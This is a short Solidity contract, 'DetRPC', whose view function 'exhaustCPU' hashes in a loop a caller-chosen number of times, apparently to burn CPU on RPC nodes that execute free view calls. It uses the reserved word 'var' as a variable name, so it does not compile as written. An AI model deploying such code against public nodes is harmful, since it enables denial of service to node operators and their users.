// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract DetRPC {
  function exhaustCPU(uint256 payload) public view returns(bool) {
    bytes32 var = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    for (uint256 i=0; i<payload; ++i){
      var = keccak256(abi.encodePacked(var));
    }
    return true;
    }
}